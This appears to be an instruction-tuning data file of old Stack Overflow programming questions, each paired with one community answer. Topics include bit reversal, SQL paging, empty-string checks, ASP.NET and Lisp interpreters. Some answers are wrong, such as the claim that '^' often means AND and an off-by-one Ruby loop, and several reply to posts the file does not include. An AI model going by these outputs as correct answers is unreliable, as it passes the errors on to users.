{"instruction": "I was reading Joel's book where he was suggesting as interview question:\n\nWrite a program to reverse the \"ON\" bits in a given byte.\n\nI only can think of a solution using C. \nAsking here so you can show me how to do in a Non C way (if possible)", "output": "Reversing the order of bits in C#:\nbyte ReverseByte(byte b)\n{\n    byte r = 0;\n    for(int i=0; i<8; i++)\n    {\n        int mask = 1 << i;\n        int bit = (b & mask) >> i;\n        int reversedMask = bit << (7 - i);\n        r |= (byte)reversedMask;\n    }\n    return r;\n}\n\nI'm sure there are more clever ways of doing it but in that precise case, the interview question is meant to determine if you know bitwise operations so I guess this solution would work.\nIn an interview, the interviewer usually wants to know how you find a solution, what are you problem solving skills, if it's clean or if it's a hack. So don't come up with too much of a clever solution because that will probably mean you found it somewhere on the Internet beforehand. Don't try to fake that you don't know it neither and that you just come up with the answer because you are a genius, this is will be even worst if she figures out since you are basically lying."}
{"instruction": "I was reading Joel's book where he was suggesting as interview question:\n\nWrite a program to reverse the \"ON\" bits in a given byte.\n\nI only can think of a solution using C. \nAsking here so you can show me how to do in a Non C way (if possible)", "output": "The classic Bit Hacks page has several (really very clever) ways to do this, but it's all in C. Any language derived from C syntax (notably Java) will likely have similar methods. I'm sure we'll get some Haskell versions in this thread ;)"}
{"instruction": "I was reading Joel's book where he was suggesting as interview question:\n\nWrite a program to reverse the \"ON\" bits in a given byte.\n\nI only can think of a solution using C. \nAsking here so you can show me how to do in a Non C way (if possible)", "output": "byte ReverseByte(byte b)\n  {\n      return b ^ 0xff;\n  }\n\nThat works if ^ is XOR in your language, but not if it's AND, which it often is."}
{"instruction": "Is there available any tool for PHP which can be used to generate code for consuming a web service based on its WSDL? Something comparable to clicking \"Add Web Reference\" in Visual Studio or the Eclipse plugin which does the same thing for Java.", "output": "I have used NuSOAP in the past.  I liked it because it is just a set of PHP files that you can include.  There is nothing to install on the web server and no config options to change.  It has WSDL support as well which is a bonus."}
{"instruction": "How do I page results in SQL Server 2005?\nI tried it in SQL Server 2000, but there was no reliable way to do this. I'm now wondering if SQL Server 2005 has any built in method?\nWhat I mean by paging is, for example, if I list users by their username, I want to be able to only return the first 10 records, then the next 10 records and so on.\nAny help would be much appreciated.", "output": "Here's what I do for paging:  All of my big queries that need to be paged are coded as inserts into a temp table.  The temp table has an identity field that will act in a similar manner to the row_number() mentioned above.  I store the number of rows in the temp table in an output parameter so the calling code knows how many total records there are.  The calling code also specifies which page it wants, and how many rows per page, which are selected out from the temp table.\nThe cool thing about doing it this way is that I also have an \"Export\" link that allows you to get all rows from the report returned as CSV above every grid in my application.  This link uses the same stored procedure: you just return the contents of the temp table instead of doing the paging logic.  This placates users who hate paging, and want to see everything, and want to sort it in a million different ways."}
{"instruction": "I was reading Joel's book where he was suggesting as interview question:\n\nWrite a program to reverse the \"ON\" bits in a given byte.\n\nI only can think of a solution using C. \nAsking here so you can show me how to do in a Non C way (if possible)", "output": "What specifically does that question mean?\n\nGood question.  If reversing the \"ON\" bits means reversing only the bits that are \"ON\", then you will always get 0, no matter what the input is.  If it means reversing all the bits, i.e. changing all 1s to 0s and all 0s to 1s, which is how I initially read it, then that's just a bitwise NOT, or complement.  C-based languages have a complement operator, ~, that does this.  For example:\nunsigned char b = 102;      /* 0x66, 01100110 */\nunsigned char reverse = ~b; /* 0x99, 10011001 */"}
{"instruction": "I was reading Joel's book where he was suggesting as interview question:\n\nWrite a program to reverse the \"ON\" bits in a given byte.\n\nI only can think of a solution using C. \nAsking here so you can show me how to do in a Non C way (if possible)", "output": "If you're talking about switching 1's to 0's and 0's to 1's, using Ruby:\nn = 0b11001100\n~n\n\nIf you mean reverse the order:\nn = 0b11001100\neval(\"0b\" + n.to_s(2).reverse)\n\nIf you mean counting the on bits, as mentioned by another user:\nn = 123\ncount = 0\n0.upto(8) { |i| count = count + n[i] }\n\n\u2665 Ruby"}
{"instruction": "I wonder how you guys manage deployment of a database between 2 SQL Servers, specifically SQL Server 2005.\nNow, there is a development and a live one. As this should be part of a buildscript (standard windows batch, even do with current complexity of those scripts, i might switch to PowerShell or so later), Enterprise Manager/Management Studio Express do not count.\nWould you just copy the .mdf File and attach it? I am always a bit careful when working with binary data, as this seems to be a compatiblity issue (even though development and live should run the same version of the server at all time).\nOr - given the lack of \"EXPLAIN CREATE TABLE\" in T-SQL - do you do something that exports an existing database into SQL-Scripts which you can run on the target server? If yes, is there a tool that can automatically dump a given Database into SQL Queries and that runs off the command line? (Again, Enterprise Manager/Management Studio Express do not count).\nAnd lastly - given the fact that the live database already contains data, the deployment may not involve creating all tables but rather checking the difference in structure and ALTER TABLE the live ones instead, which may also need data verification/conversion when existing fields change.\nNow, i hear a lot of great stuff about the Red Gate products, but for hobby projects, the price is a bit steep.\nSo, what are you using to automatically deploy SQL Server Databases from Test to Live?", "output": "I agree with keeping everything in source control and manually scripting all changes.  Changes to the schema for a single release go into a script file created specifically for that release.  All stored procs, views, etc should go into individual files and treated just like .cs or .aspx as far as source control goes.  I use a powershell script to generate one big .sql file for updating the programmability stuff.\nI don't like automating the application of schema changes, like new tables, new columns, etc.  When doing a production release, I like to go through the change script command by command to make sure each one works as expected.  There's nothing worse than running a big change script on production and getting errors because you forgot some little detail that didn't present itself in development.\nI have also learned that indexes need to be treated just like code files and put into source control.\nAnd you should definitely have more than 2 databases - dev and live.  You should have a dev database that everybody uses for daily dev tasks.  Then a staging database that mimics production and is used to do your integration testing.  Then maybe a complete recent copy of production (restored from a full backup), if that is feasible, so your last round of installation testing goes against something that is as close to the real thing as possible."}
{"instruction": "Is it possible to access the iSight camera on a macbook programatically? By this I mean I would like to be able to just grab still frames from the iSight camera on command and then do something with them. If so, is it only accessible using objective c, or could other languages be used as well?", "output": "There's a command line utility called isightcapture that does more or less what you want to do. You could probably get the code from the developer (his e-mail address is in the readme you get when you download the utility)."}
{"instruction": "I've written a database generation script in SQL and want to execute it in my Adobe AIR application:\nCreate Table tRole (\n      roleID integer Primary Key\n      ,roleName varchar(40)\n);\nCreate Table tFile (\n    fileID integer Primary Key\n    ,fileName varchar(50)\n    ,fileDescription varchar(500)\n    ,thumbnailID integer\n    ,fileFormatID integer\n    ,categoryID integer\n    ,isFavorite boolean\n    ,dateAdded date\n    ,globalAccessCount integer\n    ,lastAccessTime date\n    ,downloadComplete boolean\n    ,isNew boolean\n    ,isSpotlight boolean\n    ,duration varchar(30)\n);\nCreate Table tCategory (\n    categoryID integer Primary Key\n    ,categoryName varchar(50)\n    ,parent_categoryID integer\n);\n...\n\nI execute this in Adobe AIR using the following methods:\npublic static function RunSqlFromFile(fileName:String):void {\n    var file:File = File.applicationDirectory.resolvePath(fileName);\n    var stream:FileStream = new FileStream();\n    stream.open(file, FileMode.READ)\n    var strSql:String = stream.readUTFBytes(stream.bytesAvailable);\n    NonQuery(strSql);\n}\n\npublic static function NonQuery(strSQL:String):void\n{\n    var sqlConnection:SQLConnection = new SQLConnection();\n    sqlConnection.open(File.applicationStorageDirectory.resolvePath(DBPATH);\n    var sqlStatement:SQLStatement = new SQLStatement();\n    sqlStatement.text = strSQL;\n    sqlStatement.sqlConnection = sqlConnection;\n    try\n    {\n        sqlStatement.execute();\n    }\n    catch (error:SQLError)\n    {\n        Alert.show(error.toString());\n    }\n}\n\nNo errors are generated, however only tRole exists. It seems that it only looks at the first query (up to the semicolon- if I remove it, the query fails). Is there a way to call multiple queries in one statement?", "output": "The SQLite API has a function called something like sqlite_prepare which takes one statement and prepares it for execution, essentially parsing the SQL and storing it in memory. This means that the SQL only has to be sent once to the database engine even though the statement is executed many times.\nAnyway, a statement is a single SQL query, that's just the rule. The AIR SQL API doesn't allow sending raw SQL to SQLite, only single statements, and the reason is, likely, that AIR uses the sqlite_prepare function when it talks to SQLite."}
{"instruction": "Is there anyone working solo and using fogbugz out there? I'm interested in personal experience/overhead versus paper.\nI am involved in several projects and get pretty hammered with lots of details to keep track of... Any experience welcome.\n(Yes I know Mr. Joel is on the stackoverflow team... I still want good answers :)", "output": "I think it's great that Joel et al. let people use FogBugs hosted for free on their own.  It's a great business strategy, because the users become fans (it is great software after all), and then they recommend it to their businesses or customers."}
{"instruction": "I was reading Joel's book where he was suggesting as interview question:\n\nWrite a program to reverse the \"ON\" bits in a given byte.\n\nI only can think of a solution using C. \nAsking here so you can show me how to do in a Non C way (if possible)", "output": "I'm probably misremembering, but I thought that Joel's question was about counting the \"on\" bits rather than reversing them."}
{"instruction": "I'm integrating .NET support into our C++ application.\nIt's an old-school MFC application, with 1 extra file compiled with the \"/clr\" option that references a CWinFormsControl.\nI'm not allowed to remove the linker flag \"/NODEFAULTLIB\".\n(We have our own build management system, not Visual Studio's.)\nThis means I have to specify all necessary libraries: VC runtime and MFC.\nOther compiler options include \"/MD\"\nNext to that: I can't use the linker flag \"/FORCE:MULTIPLE\" and just add everything:\nI'm looking for a non-overlapping set of libraries.", "output": "As a bare minimum:\nmscoree.lib\nMSVCRT.lib\nmfc90.lib (adjust version appropriately)\nAnd iterate from there."}
{"instruction": "I'm wondering how to make a release build that includes all necessary dll files into the .exe so the program can be run on a non-development machine without it having to install the microsoft redistributable on the target machine.\nWithout doing this you get the error message that the application configuration is not correct and to reinstall.", "output": "Choose Project -> Properties\nSelect Configuration -> General\nIn the box for how you should link MFC, choose to statically link it.\nChoose Linker -> Input.  Under Additional Dependencies, add any libraries you need your app to statically link in.\n\nFor more info, see this article: http://www.geekadmin.com/?p=34"}
{"instruction": "I just found /n softwares free Powershell NetCmdlets, and after playing with them I love the functionality they bring to the command line.  So it raises the question what are your favorite Cmdlets, and how do you use them?", "output": "While it is not as fun as Out-Twitter, my favorite cmdlet is Get-Member, since it allows me to examine any of the objects I'm working with and find out new properties and methods, as well as the underlying type of the object.\nIf I did not choose Get-Member, I would have to go with Out-Clipboard from the PowerShell Community Extensions (PSCX), as it enables a whole lot of clipboard automation and makes using PowerShell for code templating much easier."}
{"instruction": "Many applications have grids that display data from a database table one page at a time. Many of them also let the user pick the number of records per page, sort by any column, and navigate back and forth through the results.\nWhat's a good algorithm to implement this pattern without bringing the entire table to the client and then filtering the data on the client. How do you bring just the records you want to display to the user?\nDoes LINQ simplify the solution?", "output": "On MS SQL Server 2005 and above, ROW_NUMBER() seems to work:\nT-SQL: Paging with ROW_NUMBER()\nDECLARE @PageNum AS INT;\nDECLARE @PageSize AS INT;\nSET @PageNum = 2;\nSET @PageSize = 10;\n\nWITH OrdersRN AS\n(\n    SELECT ROW_NUMBER() OVER(ORDER BY OrderDate, OrderID) AS RowNum\n          ,OrderID\n          ,OrderDate\n          ,CustomerID\n          ,EmployeeID\n      FROM dbo.Orders\n)\n\nSELECT * \n  FROM OrdersRN\n WHERE RowNum BETWEEN (@PageNum - 1) * @PageSize + 1 \n                  AND @PageNum * @PageSize\n ORDER BY OrderDate\n         ,OrderID;"}
{"instruction": "Many applications have grids that display data from a database table one page at a time. Many of them also let the user pick the number of records per page, sort by any column, and navigate back and forth through the results.\nWhat's a good algorithm to implement this pattern without bringing the entire table to the client and then filtering the data on the client. How do you bring just the records you want to display to the user?\nDoes LINQ simplify the solution?", "output": "Actually, LINQ has Skip and Take methods which can be combined to choose which records are fetched.\nCheck those out.\nFor DB: Pagination In SQL Server 2005"}
{"instruction": "Many applications have grids that display data from a database table one page at a time. Many of them also let the user pick the number of records per page, sort by any column, and navigate back and forth through the results.\nWhat's a good algorithm to implement this pattern without bringing the entire table to the client and then filtering the data on the client. How do you bring just the records you want to display to the user?\nDoes LINQ simplify the solution?", "output": "Oracle Solution:\nselect * from (\n    select a.*, rownum rnum from (\n        YOUR_QUERY_GOES_HERE -- including the order by\n    ) a\n    where rownum <= MAX_ROW\n ) where rnum >= MIN_ROW"}
{"instruction": "Which is more efficient for the compiler and the best practice for checking whether a string is blank? \n\nChecking whether the length of the string == 0\nChecking whether the string is empty (strVar == \"\")\n\nAlso, does the answer depend on language?", "output": "Yes, it depends on language, since string storage differs between languages.\n\nPascal-type strings: Length = 0.\nC-style strings: [0] == 0. \n.NET: .IsNullOrEmpty.\n\nEtc."}
{"instruction": "Which is more efficient for the compiler and the best practice for checking whether a string is blank? \n\nChecking whether the length of the string == 0\nChecking whether the string is empty (strVar == \"\")\n\nAlso, does the answer depend on language?", "output": "In .Net:\nstring.IsNullOrEmpty( nystr );\n\nstrings can be null, so .Length sometimes throws a NullReferenceException"}
{"instruction": "Which is more efficient for the compiler and the best practice for checking whether a string is blank? \n\nChecking whether the length of the string == 0\nChecking whether the string is empty (strVar == \"\")\n\nAlso, does the answer depend on language?", "output": "Actually, IMO the best way to determine is the IsNullOrEmpty() method of the string class.\nhttp://msdn.microsoft.com/en-us/library/system.string.isnullorempty.\nUpdate: I assumed .Net, in other languages, this might be different."}
{"instruction": "Which is more efficient for the compiler and the best practice for checking whether a string is blank? \n\nChecking whether the length of the string == 0\nChecking whether the string is empty (strVar == \"\")\n\nAlso, does the answer depend on language?", "output": "In languages that use C-style (null-terminated) strings, comparing to \"\" will be faster.  That's an O(1) operation, while taking the length of a C-style string is O(n).\nIn languages that store length as part of the string object (C#, Java, ...) checking the length is also O(1).  In this case, directly checking the length is faster, because it avoids the overhead of constructing the new empty string."}
{"instruction": "I've kept up to date with new features in the C# language as it's moved from version 1 through version 3.  I haven't done such a good job keeping up to date with ASP.NET.  I feel like some of the post version 1 features are not so good (e.g. the AJAX framework) or are just not that useful to me (e.g. the membership framework).  Can anyone recommend any new killer ASP.NET features that might have gone unnoticed?", "output": "I'm still learning ASP.net so I can't tell you exactly, but if you look through http://www.asp.net/learn/ you'll probably find a few new gems, there's even a 3.5 section."}
{"instruction": "I've kept up to date with new features in the C# language as it's moved from version 1 through version 3.  I haven't done such a good job keeping up to date with ASP.NET.  I feel like some of the post version 1 features are not so good (e.g. the AJAX framework) or are just not that useful to me (e.g. the membership framework).  Can anyone recommend any new killer ASP.NET features that might have gone unnoticed?", "output": "Check out the MVC framework which is built ontop of 3.5.  Big improvement over the traditional webforms model."}
{"instruction": "I've kept up to date with new features in the C# language as it's moved from version 1 through version 3.  I haven't done such a good job keeping up to date with ASP.NET.  I feel like some of the post version 1 features are not so good (e.g. the AJAX framework) or are just not that useful to me (e.g. the membership framework).  Can anyone recommend any new killer ASP.NET features that might have gone unnoticed?", "output": "Its the MVC framework.  Without 3.5, there is no MVC.  Without MVC, ASP.NET is a PITA."}
{"instruction": "Many applications have grids that display data from a database table one page at a time. Many of them also let the user pick the number of records per page, sort by any column, and navigate back and forth through the results.\nWhat's a good algorithm to implement this pattern without bringing the entire table to the client and then filtering the data on the client. How do you bring just the records you want to display to the user?\nDoes LINQ simplify the solution?", "output": "I'd recommend either using LINQ, or try to copy what it does. I've got an app where I use the LINQ Take and Skip methods to retrieve paged data. The code looks something like this:\nMyDataContext db = new MyDataContext();\nvar results = db.Products\n    .Skip((pageNumber - 1) * pageSize)\n    .Take(pageSize);\n\nRunning SQL Server Profiler reveals that LINQ is converting this query into SQL similar to:\nSELECT [ProductId], [Name], [Cost], and so on...\nFROM (\n    SELECT [ProductId], [Name], [Cost], [ROW_NUMBER]\n    FROM (\n       SELECT ROW_NUMBER() OVER (ORDER BY [Name]) AS [ROW_NUMBER], \n           [ProductId], [Name], [Cost]\n       FROM [Products]\n    )\n    WHERE [ROW_NUMBER] BETWEEN 10 AND 20\n)\nORDER BY [ROW_NUMBER]\n\nIn plain English:\n1. Filter your rows and use the ROW_NUMBER function to add row numbers in the order you want.\n2. Filter (1) to return only the row numbers you want on your page.\n3. Sort (2) by the row number, which is the same as the order you wanted (in this case, by Name)."}
{"instruction": "Which is more efficient for the compiler and the best practice for checking whether a string is blank? \n\nChecking whether the length of the string == 0\nChecking whether the string is empty (strVar == \"\")\n\nAlso, does the answer depend on language?", "output": "In Java 1.6, the String class has a new method isEmpty \nThere is also the Jakarta commons library, which has the isBlank method. Blank is defined as a string that contains only whitespace."}
{"instruction": "Which is more efficient for the compiler and the best practice for checking whether a string is blank? \n\nChecking whether the length of the string == 0\nChecking whether the string is empty (strVar == \"\")\n\nAlso, does the answer depend on language?", "output": "In this case, directly checking the length is faster, because it avoids the overhead of constructing the new empty string.\n\n@DerekPark: That's not always true. \"\" is a string literal so, in Java, it will almost certainly already be interned."}
{"instruction": "Which is more efficient for the compiler and the best practice for checking whether a string is blank? \n\nChecking whether the length of the string == 0\nChecking whether the string is empty (strVar == \"\")\n\nAlso, does the answer depend on language?", "output": "For C strings,\nif (s[0] == 0)\n\nwill be faster than either\nif (strlen(s) == 0)\n\nor\nif (strcmp(s, \"\") == 0)\n\nbecause you will avoid the overhead of a function call."}
{"instruction": "Which is more efficient for the compiler and the best practice for checking whether a string is blank? \n\nChecking whether the length of the string == 0\nChecking whether the string is empty (strVar == \"\")\n\nAlso, does the answer depend on language?", "output": "In languages that use C-style (null-terminated) strings, comparing to \"\" will be faster\n\nActually, it may be better to check if the first char in the string is '\\0':\nchar *mystring;\n/* do something with the string */\nif ((mystring != NULL) && (mystring[0] == '\\0')) {\n    /* the string is empty */\n}\n\nIn Perl there's a third option, that the string is undefined.  This is a bit different from a NULL pointer in C, if only because you don't get a segmentation fault for accessing an undefined string."}
{"instruction": "I've been playing around with the ASP.NET MVC Framework and the one thing that's really confusing me is how I'm meant to do server side validation of posted form data.  I presume I don't post back to the same URL, but if I don't, how do I redisplay the form with the entered data and error messages?  Also, where should the validation logic go?  In the model or the controller?  This seems to be one of the few areas where web forms are much stronger (I miss the validation controls).", "output": "Have you taken a look at this?\nhttp://www.codeplex.com/MvcValidatorToolkit\nQuoted from the page\n\nThe Validator Toolkit provides a set\n  of validators for the new ASP.NET MVC\n  framework to validate HTML forms on\n  the client and server-side using\n  validation sets.\n\nI'm afraid that someone more MVC-savvy than me would have to speak to where in the architecture you should put things."}
{"instruction": "Which is more efficient for the compiler and the best practice for checking whether a string is blank? \n\nChecking whether the length of the string == 0\nChecking whether the string is empty (strVar == \"\")\n\nAlso, does the answer depend on language?", "output": "@Nathan\n\nActually, it may be better to check if the first char in the string is '\\0':\n\nI almost mentioned that, but ended up leaving it out, since calling strcmp() with the empty string and directly checking the first character in the string are both O(1).  You basically just pay for an extra function call, which is pretty cheap.  If you really need the absolute best speed, though, definitely go with a direct first-char-to-0 comparison.\nHonestly, I always use strlen() == 0, because I have never written a program where this was actually a measurable performance issue, and I think that's the most readable way to express the check."}
{"instruction": "I've kept up to date with new features in the C# language as it's moved from version 1 through version 3.  I haven't done such a good job keeping up to date with ASP.NET.  I feel like some of the post version 1 features are not so good (e.g. the AJAX framework) or are just not that useful to me (e.g. the membership framework).  Can anyone recommend any new killer ASP.NET features that might have gone unnoticed?", "output": "I don't think the MVC Framework is quite ready for prime time yet, though I definitely plan to use it sometime next year.  I love the clean URLs, clean XHTML (web forms can really spew out some nasty HTML) and the ability to create controller actions with no associated view.\nI've been using Master Pages since they were released and they've been a big help.  I do really dislike the way the master pages add the nasty prefixes to the control IDs.  It makes for some ugly CSS.  I think the MVC Framework may eliminate this problem though.\nAny other killer features?"}
{"instruction": "I've been playing around with the ASP.NET MVC Framework and the one thing that's really confusing me is how I'm meant to do server side validation of posted form data.  I presume I don't post back to the same URL, but if I don't, how do I redisplay the form with the entered data and error messages?  Also, where should the validation logic go?  In the model or the controller?  This seems to be one of the few areas where web forms are much stronger (I miss the validation controls).", "output": "I'm just learning the MVC framework too so I'm not sure how off this is, but from what I understand you would have a form on a View such as Edit.aspx.  This form would then post to the controller to another action method such as Update() passing in the contents of the form that you set in Edit.aspx as parameters.\nUpdate(int id, string name, string foo)\n\nYou could do the validation within that method.  If all is ok, \nreturn View(\"Item\", yourObject)"}
{"instruction": "I've kept up to date with new features in the C# language as it's moved from version 1 through version 3.  I haven't done such a good job keeping up to date with ASP.NET.  I feel like some of the post version 1 features are not so good (e.g. the AJAX framework) or are just not that useful to me (e.g. the membership framework).  Can anyone recommend any new killer ASP.NET features that might have gone unnoticed?", "output": "ListView and its friend DataPager are probably worth looking at, but they're hardly \"Killer\" features.\nThings outside of ASP.NET specifically (LINQ, for example) are probably more likely to be get the \"Killer\" commendation."}
{"instruction": "I've kept up to date with new features in the C# language as it's moved from version 1 through version 3.  I haven't done such a good job keeping up to date with ASP.NET.  I feel like some of the post version 1 features are not so good (e.g. the AJAX framework) or are just not that useful to me (e.g. the membership framework).  Can anyone recommend any new killer ASP.NET features that might have gone unnoticed?", "output": "Master Pages\n(of course, these are in there from\n  version 2.0)\n\nNested master pages are new in 3.5.  I haven't used them yet, but I can only imagine they could turn into a hidious nightmare if not used very carefully.\nYou only have to look at the order in which the events are fired in a page that uses a master page to think 'urgh'."}
{"instruction": "I've kept up to date with new features in the C# language as it's moved from version 1 through version 3.  I haven't done such a good job keeping up to date with ASP.NET.  I feel like some of the post version 1 features are not so good (e.g. the AJAX framework) or are just not that useful to me (e.g. the membership framework).  Can anyone recommend any new killer ASP.NET features that might have gone unnoticed?", "output": "The split design/code view is pretty cool.  It's not perfect yet, but it's pretty cool.  Also editing in the design view now edits your css there and then."}
{"instruction": "I've kept up to date with new features in the C# language as it's moved from version 1 through version 3.  I haven't done such a good job keeping up to date with ASP.NET.  I feel like some of the post version 1 features are not so good (e.g. the AJAX framework) or are just not that useful to me (e.g. the membership framework).  Can anyone recommend any new killer ASP.NET features that might have gone unnoticed?", "output": "I don't think the MVC Framework is quite ready for prime time yet\n\nJust an FYI, this site is built in MVC.\nI also have 2 apps in production on mvc, I would argue that its definitely ready for prime time."}
{"instruction": "Say you have an application divided into 3-tiers: GUI, business logic, and data access. In your business logic layer you have described your business objects: getters, setters, accessors, and so on... you get the idea. The interface to the business logic layer guarantees safe usage of the business logic, so all the methods and accessors you call will validate input. \nThis great when you first write the UI code, because you have a neatly defined interface that you can trust.\nBut here comes the tricky part, when you start writing the data access layer, the interface to the business logic does not accommodate your needs. You need to have more accessors and getters to set fields which are/used to be hidden. Now you are forced to erode the interface of your business logic; now it is possible set fields from the UI layer, which the UI layer has no business setting. \nBecause of the changes needed for the data access layer, the interface to the business logic has eroded to the point where it is possible to even set the business logic with invalid data. Thus, the interface does not guarantee safe usage anymore.\nI hope I explained the problem clearly enough. How do you prevent interface eroding, maintain information hiding and encapsulation, and yet still accommodate different interface needs among different layers?", "output": "I'm going to continue my habit of going against the grain and say that you should question why you are building all these horribly complex object layers.\nI think many developers think of the database as a simple persistence layer for their objects, and are only concerned with the CRUD operations that those objects need.  Too much effort is being put into the \"impedence mismatch\" between object and relational models.  Here's an idea: stop trying.\nWrite stored procedures to encapsulate your data.  Use results sets, DataSet, DataTable, SqlCommand (or the java/php/whatever equivalent) as needed from code to interact with the database.  You don't need those objects.  An excellent example is embedding a SqlDataSource into a .ASPX page.\nYou shouldn't try to hide your data from anyone.  Developers need to understand exactly how and when they are interacting with the physical data store.\nObject-relational mappers are the devil.  Stop using them.\nBuilding enterprise applications is often an exercise in managing complexity.  You have to keep things as simple as possible, or you will have an absolutely un-maintainable system.  If you are willing to allow some coupling (which is inherent in any application anyway), you can do away with both your business logic layer and your data access layer (replacing them with stored procedures), and you won't need any of those interfaces."}
{"instruction": "I've been playing around with the ASP.NET MVC Framework and the one thing that's really confusing me is how I'm meant to do server side validation of posted form data.  I presume I don't post back to the same URL, but if I don't, how do I redisplay the form with the entered data and error messages?  Also, where should the validation logic go?  In the model or the controller?  This seems to be one of the few areas where web forms are much stronger (I miss the validation controls).", "output": "Here's an overview of the flow in MVC:\n\n/new - render your \"New\" view containing a form for the user to fill out\nUser fills out form and it is posted to /create\nThe post is routed to the Create action on your controller\nIn your action method, update the model with the data that was posted.\nYour Model should validate itself.\nYour Controller should read if the model is valid.\nIf the Model is valid, save it to your db.  Redirect to /show to render the show View for your object.\nIf the Model is invalid, save the form values and error messages in the TempData, and redirect to the New action again.  Fill your form fields with the data from TempData and show the error message(s).\n\nThe validation frameworks will help you along in this process.  Also, I think the ASP.NET MVC team is planning a validation framework for the next preview."}
{"instruction": "I've kept up to date with new features in the C# language as it's moved from version 1 through version 3.  I haven't done such a good job keeping up to date with ASP.NET.  I feel like some of the post version 1 features are not so good (e.g. the AJAX framework) or are just not that useful to me (e.g. the membership framework).  Can anyone recommend any new killer ASP.NET features that might have gone unnoticed?", "output": "@IainMH  Nested Master Pages were always supported by ASP.NET, just not by the designer."}
{"instruction": "I'm integrating .NET support into our C++ application.\nIt's an old-school MFC application, with 1 extra file compiled with the \"/clr\" option that references a CWinFormsControl.\nI'm not allowed to remove the linker flag \"/NODEFAULTLIB\".\n(We have our own build management system, not Visual Studio's.)\nThis means I have to specify all necessary libraries: VC runtime and MFC.\nOther compiler options include \"/MD\"\nNext to that: I can't use the linker flag \"/FORCE:MULTIPLE\" and just add everything:\nI'm looking for a non-overlapping set of libraries.", "output": "Use the AppWizard to create a bare-bones MFC app in your style (SDI / MDI / dialog ) and then put on your depends."}
{"instruction": "I've been wanting to teach myself Lisp for a while.  However, all the interpreters of which I've heard involve some flavor of emacs.\nAre there any command line interpreters, such that I could type this into the command line:\n\nlispinterpret sourcefile.lisp\n\njust like I can run perl or python.\nWhile I'd also like to become more familiar with Emacs (if only not to be frustrated when I work with somebody who uses Emacs), I'd rather decouple learning Emacs from learning Lisp.\nEdit: I actually want to follow SICP which uses Scheme, so an answer about Scheme would be more useful.  I'm just not that familiar with the differences.", "output": "@Nathan: I've upmodded the Common Lisp links, because you asked about Lisp (especially with reference to Emacs Lisp). However, Common Lisp is very different from Scheme. A program written for one is unlikely to run on the other.\nAs you mentioned, SICP is for learning Scheme, not Lisp (or at least, not Common Lisp and not Emacs Lisp). There are some overlap in principles, however you can't simply cut and paste code from SICP and expect it to run on any Common Lisp or Emacs Lisp system. :-)"}
{"instruction": "I've been wanting to teach myself Lisp for a while.  However, all the interpreters of which I've heard involve some flavor of emacs.\nAre there any command line interpreters, such that I could type this into the command line:\n\nlispinterpret sourcefile.lisp\n\njust like I can run perl or python.\nWhile I'd also like to become more familiar with Emacs (if only not to be frustrated when I work with somebody who uses Emacs), I'd rather decouple learning Emacs from learning Lisp.\nEdit: I actually want to follow SICP which uses Scheme, so an answer about Scheme would be more useful.  I'm just not that familiar with the differences.", "output": "Another good dialect of lisp is cmucl.  They used to love to brag about being the \"fastest\" lisp."}
{"instruction": "What is BODMAS and why is it useful in programming?", "output": "I don't have the power to edit @Michael Stum's answer, but it's not quite correct.  He reduces\n(i + 4) - (a + b)\n\nto\n(i + 4 - a + b)\n\nThey are not equivalent.  The best reduction I can get for the whole expression is\n((i + 4) - (a + b)) * MAGIC_NUMBER - ANOTHER_MAGIC_NUMBER;\n\nor\n(i + 4 - a - b) * MAGIC_NUMBER - ANOTHER_MAGIC_NUMBER;"}
{"instruction": "I was reading Joel's book where he was suggesting as interview question:\n\nWrite a program to reverse the \"ON\" bits in a given byte.\n\nI only can think of a solution using C. \nAsking here so you can show me how to do in a Non C way (if possible)", "output": "Since the question asked for a non-C way, here's a Scheme implementation, cheerfully plagiarised from SLIB:\n(define (bit-reverse k n)\n  (do ((m (if (negative? n) (lognot n) n) (arithmetic-shift m -1))\n       (k (+ -1 k) (+ -1 k))\n       (rvs 0 (logior (arithmetic-shift rvs 1) (logand 1 m))))\n      ((negative? k) (if (negative? n) (lognot rvs) rvs))))\n\n(define (reverse-bit-field n start end)\n  (define width (- end start))\n  (let ((mask (lognot (ash -1 width))))\n    (define zn (logand mask (arithmetic-shift n (- start))))\n    (logior (arithmetic-shift (bit-reverse width zn) start)\n            (logand (lognot (ash mask start)) n))))\n\nRewritten as C (for people unfamiliar with Scheme), it'd look something like this (with the understanding that in Scheme, numbers can be arbitrarily big):\nint\nbit_reverse(int k, int n)\n{\n    int m = n < 0 ? ~n : n;\n    int rvs = 0;\n    while (--k >= 0) {\n        rvs = (rvs << 1) | (m & 1);\n        m >>= 1;\n    }\n    return n < 0 ? ~rvs : rvs;\n}\n\nint\nreverse_bit_field(int n, int start, int end)\n{\n    int width = end - start;\n    int mask = ~(-1 << width);\n    int zn = mask & (n >> start);\n    return (bit_reverse(width, zn) << start) | (~(mask << start) & n);\n}"}
{"instruction": "I was reading Joel's book where he was suggesting as interview question:\n\nWrite a program to reverse the \"ON\" bits in a given byte.\n\nI only can think of a solution using C. \nAsking here so you can show me how to do in a Non C way (if possible)", "output": "And here's a version directly cut and pasted from OpenJDK, which is interesting because it involves no loop. On the other hand, unlike the Scheme version I posted, this version only works for 32-bit and 64-bit numbers. :-)\n32-bit version:\npublic static int reverse(int i) {\n    // HD, Figure 7-1\n    i = (i & 0x55555555) << 1 | (i >>> 1) & 0x55555555;\n    i = (i & 0x33333333) << 2 | (i >>> 2) & 0x33333333;\n    i = (i & 0x0f0f0f0f) << 4 | (i >>> 4) & 0x0f0f0f0f;\n    i = (i << 24) | ((i & 0xff00) << 8) |\n        ((i >>> 8) & 0xff00) | (i >>> 24);\n    return i;\n}\n\n64-bit version:\npublic static long reverse(long i) {\n    // HD, Figure 7-1\n    i = (i & 0x5555555555555555L) << 1 | (i >>> 1) & 0x5555555555555555L;\n    i = (i & 0x3333333333333333L) << 2 | (i >>> 2) & 0x3333333333333333L;\n    i = (i & 0x0f0f0f0f0f0f0f0fL) << 4 | (i >>> 4) & 0x0f0f0f0f0f0f0f0fL;\n    i = (i & 0x00ff00ff00ff00ffL) << 8 | (i >>> 8) & 0x00ff00ff00ff00ffL;\n    i = (i << 48) | ((i & 0xffff0000L) << 16) |\n        ((i >>> 16) & 0xffff0000L) | (i >>> 48);\n    return i;\n}"}
